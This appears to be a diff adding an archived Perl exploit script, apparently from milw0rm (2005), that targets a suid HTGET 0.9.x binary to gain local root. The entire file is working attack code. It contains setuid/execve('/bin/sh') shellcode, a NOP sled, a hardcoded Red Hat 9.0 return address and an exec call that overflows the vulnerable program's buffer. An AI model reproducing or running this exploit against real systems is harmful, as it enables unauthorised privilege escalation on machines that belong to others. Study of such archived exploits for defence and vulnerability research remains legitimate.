@@ -1,0 +1,42 @@
+#!/usr/bin/perl
+#^^^^^^^^^^^^^^^^\....,,,,|:::::::____******
+#HTGET <= 0.9.x local lame r00t exploit	    *	
+#written by nekd0 of Unl0ck Research Team    *
+#(c) .unl0ck research team 2004-2005. 	     *
+#	http://unl0ck.void.ru		    *	
+#................/^^^^''''|:::::::----******
+
+$shellcode = 
+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80".
+"\xb0\x2e\xcd\x80\xeb\x15\x5b\x31".
+"\xc0\x88\x43\x07\x89\x5b\x08\x89".
+"\x43\x0c\x8d\x4b\x08\x31\xd2\xb0".
+"\x0b\xcd\x80\xe8\xe6\xff\xff\xff".
+"/bin/sh";
+
+$len = 288;
+$ret = 0xbfffd62a; #red hat 9.0 
+$nop = "\x90";
+$offset = 0 ;
+$vulnprog="/usr/bin/htget";
+
+if (@ARGV == 1) {
+    $offset = $ARGV[0];}
+
+if (!-u($vulnprog)){print "$vulnprog is not suid... exiting\n";exit();}
+
+for ($i=0; $i<($len-length($shellcode)-100);$i++)
+	{$buffer .= $nop;}
+
+$buffer .= $shellcode;
+
+print ("Address: 0x",sprintf('%lx',($ret+$offset)),"\n");
+
+$new_ret = pack('l',($ret + $offset));
+
+for ($i+=length($shellcode); $i<$len; $i+=4)
+	{$buffer .=$new_ret}
+
+exec("$vulnprog $buffer");
+
+# milw0rm.com [2005-01-05]
